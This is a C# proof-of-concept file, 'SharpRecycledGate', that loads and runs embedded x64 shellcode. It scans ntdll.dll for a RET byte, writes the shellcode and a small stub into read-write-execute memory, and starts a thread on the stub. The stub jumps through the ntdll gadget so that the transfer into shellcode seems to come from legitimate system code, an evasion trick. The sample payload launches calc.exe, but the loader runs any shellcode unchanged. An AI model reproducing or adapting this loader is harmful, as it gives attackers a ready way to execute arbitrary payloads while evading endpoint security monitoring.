/**
 * SharpRecycledGate - A C# implementation of the RecycledGate technique
 *
 * This version attempts a more traditional RecycledGate flow:
 * 1. Finds a RET (0xC3) instruction in ntdll.dll.
 * 2. Allocates memory for shellcode and a small setup stub.
 * 3. The setup stub pushes the shellcode's address onto the stack.
 * 4. The setup stub then jumps to the found RET gadget in ntdll.dll.
 * 5. The RET gadget executes, popping the shellcode address from the stack into RIP.
 * 6. Execution transfers to the shellcode.
 *
 * This aims to have the final control transfer originate from legitimate code (ntdll.dll).
 */

using System;
using System.Runtime.InteropServices;

namespace SharpRecycledGate
{
    internal class Program
    {
        // ============== Native API Imports (Complete) =================
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);


        // ============== Memory Constants (Complete) ==================
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;

        // ============== PE Format Constants (Complete) =================
        const ushort IMAGE_DOS_SIGNATURE = 0x5A4D; // MZ
        const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00
        const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;

        // ============== PE Format Structures (Complete) =================
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DOS_HEADER
        {
            public ushort e_magic; 
            public ushort e_cblp; 
            public ushort e_cp; 
            public ushort e_crlc; 
            public ushort e_cparhdr; 
            public ushort e_minalloc; 
            public ushort e_maxalloc; 
            public ushort e_ss; 
            public ushort e_sp; 
            public ushort e_csum; 
            public ushort e_ip; 
            public ushort e_cs; 
            public ushort e_lfarlc; 
            public ushort e_ovno; 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1; 
            public ushort e_oemid; 
            public ushort e_oeminfo; 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2; 
            public int e_lfanew; 
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_OPTIONAL_HEADER64 // Assume x64
        {
            public ushort Magic; 
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            // Removed BaseOfData for x64
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            // IMAGE_DATA_DIRECTORY DataDirectory[16] follows here, but not needed for gadget finding
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_NT_HEADERS64 // Assume x64
        {
            public uint Signature; 
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        [StructLayout(LayoutKind.Explicit, Size = 40)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name; 

            [FieldOffset(8)] 
            public uint PhysicalAddress; 

            [FieldOffset(8)]
            public uint VirtualSize;

            [FieldOffset(12)]
            public uint VirtualAddress; 

            [FieldOffset(16)]
            public uint SizeOfRawData; 

            [FieldOffset(20)]
            public uint PointerToRawData; 

            [FieldOffset(24)]
            public uint PointerToRelocations;

            [FieldOffset(28)]
            public uint PointerToLinenumbers;

            [FieldOffset(32)]
            public ushort NumberOfRelocations;

            [FieldOffset(34)]
            public ushort NumberOfLinenumbers;

            [FieldOffset(36)]
            public uint Characteristics; 
        }

       
        // Gadget finding function 
        static IntPtr FindRetGadgetInModule(string moduleName)
        {
            IntPtr hModule = GetModuleHandle(moduleName);
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Failed to get handle for {moduleName}. Error: {Marshal.GetLastWin32Error()}");
                return IntPtr.Zero;
            }
            Console.WriteLine($"[*] Got handle for {moduleName}: 0x{hModule.ToString("X")}");

            try
            {
                // Read DOS Header
                IMAGE_DOS_HEADER dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(hModule);
                if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
                {
                    Console.WriteLine("[-] Invalid DOS signature.");
                    return IntPtr.Zero;
                }

                // Calculate NT Headers address
                IntPtr ntHeadersPtr = IntPtr.Add(hModule, dosHeader.e_lfanew);
                uint ntSignature = (uint)Marshal.ReadInt32(ntHeadersPtr); // Read signature first
                if (ntSignature != IMAGE_NT_SIGNATURE)
                {
                    Console.WriteLine("[-] Invalid NT signature.");
                    return IntPtr.Zero;
                }

                // Read NT Headers (assuming x64 based on OptionalHeader64 struct)
                IMAGE_NT_HEADERS64 ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeadersPtr);

                // Validate Optional Header Magic for PE32+ (x64)
                if (ntHeaders.OptionalHeader.Magic != 0x020b) // PE32+ Magic Number
                {
                    Console.WriteLine($"[-] Incorrect Optional Header Magic for x64: 0x{ntHeaders.OptionalHeader.Magic:X}. Expected 0x20b.");
                    return IntPtr.Zero; // Or handle x86 if needed
                }

                // Calculate address of the first section header
                // Offset = Signature size (4) + FileHeader size + SizeOfOptionalHeader
                int sizeOfOptionalHeader = ntHeaders.FileHeader.SizeOfOptionalHeader;
                IntPtr firstSectionHeaderPtr = IntPtr.Add(ntHeadersPtr,
                    sizeof(uint) + // Size of Signature
                    Marshal.SizeOf(typeof(IMAGE_FILE_HEADER)) +
                    sizeOfOptionalHeader);

                Console.WriteLine($"[*] Found {ntHeaders.FileHeader.NumberOfSections} sections. Scanning executable ones...");

                // Iterate through section headers
                for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
                {
                    // Calculate address of the current section header
                    IntPtr currentSectionHeaderPtr = IntPtr.Add(firstSectionHeaderPtr, i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
                    IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(currentSectionHeaderPtr);

                    // Check if the section is executable
                    if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0)
                    {
                        // Get section name safely
                        string sectionName = new string(sectionHeader.Name).TrimEnd('\0', ' ');
                        Console.WriteLine($"[*] Scanning executable section '{sectionName}' (RVA: 0x{sectionHeader.VirtualAddress:X}, Size: {sectionHeader.VirtualSize} bytes)...");

                        // Calculate section start and end virtual addresses in memory
                        IntPtr sectionStartAddress = IntPtr.Add(hModule, (int)sectionHeader.VirtualAddress);
                        // Prevent overflow by using Int64 for comparison if needed, though VirtualSize is uint
                        IntPtr sectionEndAddress = IntPtr.Add(sectionStartAddress, (int)sectionHeader.VirtualSize);

                        // Scan the section byte-by-byte
                        for (IntPtr currentAddr = sectionStartAddress;
                             currentAddr.ToInt64() < sectionEndAddress.ToInt64(); // Use ToInt64 for comparison safety
                             currentAddr = IntPtr.Add(currentAddr, 1))
                        {
                            try
                            {
                                byte currentByte = Marshal.ReadByte(currentAddr);
                                if (currentByte == 0xC3) 
                                {
                                    Console.WriteLine($"[+] Found RET (0xC3) at 0x{currentAddr.ToString("X")} in section '{sectionName}'.");
                                    return currentAddr; // Return the first one found
                                }
                            }
                            catch (AccessViolationException) 
                            { 
                                Console.WriteLine($"[!] Access violation while reading memory at 0x{currentAddr.ToString("X")}. Skipping rest of section.");
                                break; 
                            }
                            catch (Exception ex) 
                            {
                                Console.WriteLine($"[!] Exception while reading memory at 0x{currentAddr.ToString("X")}: {ex.GetType().Name}. Skipping rest of section.");
                                break; 
                            }
                        }
                    }
                }

                Console.WriteLine("[-] No RET (0xC3) instruction found in any executable section.");
                return IntPtr.Zero;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] An error occurred during PE parsing or scanning: {ex.Message}");
                return IntPtr.Zero;
            }
        }

        // Generates the setup stub ***
        // This stub pushes the shellcode address and jumps to the RET gadget.
        static byte[] GenerateRetGadgetStub(IntPtr retGadgetAddr, IntPtr shellcodeAddr)
        {
            Console.WriteLine("[*] Building setup stub for RET gadget execution...");

            // x64 Assembly:
            // mov rax, <shellcodeAddr x64>  ; 48 B8 XX XX XX XX XX XX XX XX (10 bytes)
            // push rax                         ; 50                          (1 byte)
            // mov rax, <retGadgetAddr x64>  ; 48 B8 YY YY YY YY YY YY YY YY (10 bytes)
            // jmp rax                          ; FF E0                       (2 bytes)
            // Total: 23 bytes

            byte[] stubCode = new byte[23];
            int offset = 0;

            try
            {
                // mov rax, shellcodeAddr (absolute x64 address)
                stubCode[offset++] = 0x48; // REX.W prefix
                stubCode[offset++] = 0xB8; // MOV RAX opcode
                BitConverter.GetBytes(shellcodeAddr.ToInt64()).CopyTo(stubCode, offset);
                offset += 8; // Size of x64 address

                // push rax
                stubCode[offset++] = 0x50; // PUSH RAX opcode

                // mov rax, retGadgetAddr (absolute x64 address)
                stubCode[offset++] = 0x48; // REX.W prefix
                stubCode[offset++] = 0xB8; // MOV RAX opcode
                BitConverter.GetBytes(retGadgetAddr.ToInt64()).CopyTo(stubCode, offset);
                offset += 8; // Size of x64 address

                // jmp rax
                stubCode[offset++] = 0xFF; // JMP opcode group
                stubCode[offset++] = 0xE0; // ModR/M byte indicating JMP RAX

                // Ensure we used exactly the expected number of bytes
                if (offset != stubCode.Length)
                {
                    Console.WriteLine($"[!] Internal error: Generated stub size ({offset}) differs from expected ({stubCode.Length}).");
                    return null;
                }

                Console.WriteLine("[+] Setup stub generated:");
                string byteString = BitConverter.ToString(stubCode).Replace("-", " ");
                Console.WriteLine($"    {byteString}");
                Console.WriteLine($"    Stub logic: Push 0x{shellcodeAddr.ToString("X")} then JMP to 0x{retGadgetAddr.ToString("X")}");

                return stubCode;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error building setup stub: {ex.Message}");
                throw;
            }
        }

        // Shellcode preparation
        static byte[] addNOPs(byte[] originalShellcode)
        {
            int nopSledSize = 16;
            byte[] modifiedShellcode = new byte[nopSledSize + originalShellcode.Length];

            // Add NOP sled at the beginning
            for (int i = 0; i < nopSledSize; i++)
            {
                modifiedShellcode[i] = 0x90;
            }

            // Copy the original shellcode after the NOP sled
            Array.Copy(originalShellcode, 0, modifiedShellcode, nopSledSize, originalShellcode.Length);

            Console.WriteLine($"[*] Added {nopSledSize}-byte NOP sled to shellcode");
            return modifiedShellcode;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] RecycledGate PoC in C#");
            Console.WriteLine("[*] Target: x64");

            // Step 1: Define the shellcode (Complete calc.exe example)
            byte[] originalShellcode = new byte[276] {
                0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,
                0x65,0x78,0x65,0x00
            };
            Console.WriteLine($"[*] Original shellcode size: {originalShellcode.Length} bytes");

            // Step 2: Prepare shellcode with NOP sled
            byte[] shellcode = addNOPs(originalShellcode);
            Console.WriteLine($"[*] Prepared shellcode size (with NOP sled): {shellcode.Length} bytes");

            // Step 3: Find the RET gadget in the target module
            string targetModule = "ntdll.dll";
            Console.WriteLine($"[*] Looking for RET gadget in {targetModule}...");
            IntPtr retGadget = FindRetGadgetInModule(targetModule);
            if (retGadget == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find RET gadget. Exiting.");
                return; // Exit if no gadget found
            }
            Console.WriteLine($"[+] Found RET (0xC3) gadget at: 0x{retGadget.ToString("X")}");

            // Step 4: Determine size of the setup stub
            // Size determined from GenerateRetGadgetStub implementation
            const int stubSize = 23;

            // Step 5: Allocate memory for BOTH the stub AND the shellcode
            uint totalSize = (uint)(stubSize + shellcode.Length);
            Console.WriteLine($"[*] Allocating {totalSize} bytes of executable memory (Stub: {stubSize}, Shellcode: {shellcode.Length})...");
            IntPtr execMem = VirtualAlloc(
                IntPtr.Zero, 
                (UIntPtr)totalSize,
                MEM_COMMIT | MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE
            );

            if (execMem == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Memory allocation failed. Error code: {Marshal.GetLastWin32Error()}");
                return;
            }
            Console.WriteLine($"[+] Memory allocated at base address: 0x{execMem.ToString("X")}");

            // Define addresses within the allocated block
            IntPtr stubAddr = execMem; // Stub goes at the beginning
            IntPtr shellcodeAddr = IntPtr.Add(execMem, stubSize); // Shellcode follows immediately after the stub

            Console.WriteLine($"[*]   Calculated Stub location: 0x{stubAddr.ToString("X")}");
            Console.WriteLine($"[*]   Calculated Shellcode location: 0x{shellcodeAddr.ToString("X")}");

            // Step 6: Generate the setup stub code (needs the calculated shellcode address)
            byte[] stubCode = GenerateRetGadgetStub(retGadget, shellcodeAddr);
            if (stubCode == null || stubCode.Length != stubSize) 
            {
                Console.WriteLine($"[-] Failed to generate setup stub correctly. Exiting.");
                // Need to free allocated memory before exiting
                VirtualFree(execMem, (UIntPtr)0, MEM_RELEASE);
                return;
            }


            // Step 7: Write the generated stub code to the allocated memory
            Console.WriteLine($"[*] Writing setup stub ({stubCode.Length} bytes) to 0x{stubAddr.ToString("X")}");
            try
            {
                Marshal.Copy(stubCode, 0, stubAddr, stubCode.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to write stub code to memory: {ex.Message}");
                VirtualFree(execMem, (UIntPtr)0, MEM_RELEASE);
                return;
            }


            // Step 8: Write the prepared shellcode immediately after the stub
            Console.WriteLine($"[*] Writing shellcode ({shellcode.Length} bytes) to 0x{shellcodeAddr.ToString("X")}");
            try
            {
                Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to write shellcode to memory: {ex.Message}");
                VirtualFree(execMem, (UIntPtr)0, MEM_RELEASE);
                return;
            }

            // Change memory protection back from RWX to RX if desired after writing
            uint oldProtect;
            bool protectResult = VirtualProtect(execMem, (UIntPtr)totalSize, PAGE_EXECUTE_READ, out oldProtect);
            if (protectResult) 
            { 
                Console.WriteLine("[*] Changed memory protection to Execute-Read."); 
            }
            else {
                Console.WriteLine($"[!] Failed to change memory protection: {Marshal.GetLastWin32Error()}"); 
            }

            Console.WriteLine("[*] Memory setup complete.");
            Console.WriteLine($"[*] Target RET Gadget is at 0x{retGadget.ToString("X")} (within {targetModule})");

            // Step 9: Execute the setup stub by creating a new thread starting at its address
            Console.WriteLine($"[*] Creating thread to execute setup stub at 0x{stubAddr.ToString("X")}...");

            uint threadId = 0;
            // The lpStartAddress points to our stub code
            IntPtr hThread = CreateThread(
                IntPtr.Zero,   
                0,              
                stubAddr,       
                IntPtr.Zero,    
                0,              
                out threadId
            );

            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine($"[-] Failed to create execution thread. Error code: {Marshal.GetLastWin32Error()}");
                VirtualFree(execMem, (UIntPtr)0, MEM_RELEASE); // Cleanup
                return;
            }

            Console.WriteLine($"[+] Execution thread created successfully with ID: {threadId}");
            Console.WriteLine("[*] Execution flow initiated:");
            Console.WriteLine($"[*]   1. Thread starts at Setup Stub (0x{stubAddr.ToString("X")})");
            Console.WriteLine($"[*]   2. Stub pushes Shellcode Address (0x{shellcodeAddr.ToString("X")}) onto stack");
            Console.WriteLine($"[*]   3. Stub jumps to RET Gadget (0x{retGadget.ToString("X")} in {targetModule})");
            Console.WriteLine($"[*]   4. RET Gadget pops Shellcode Address from stack into RIP");
            Console.WriteLine($"[*]   5. Shellcode execution begins at 0x{shellcodeAddr.ToString("X")}");

            Console.WriteLine("[*] Waiting for thread to potentially complete or signal (max 5 seconds)...");
            // Wait for the thread, mostly to see if calc pops up quickly
            WaitForSingleObject(hThread, 5000); // Wait up to 5 seconds

            Console.WriteLine("[*] RecycledGate execution sequence initiated via thread.");
            Console.WriteLine("[*] If successful, calc.exe should now be running.");

            // Basic Cleanup
            CloseHandle(hThread);
            VirtualFree(execMem, (UIntPtr)0, MEM_RELEASE); 

            Console.WriteLine("[*] Press any key to exit program...");
            Console.ReadKey();
        }
    }
}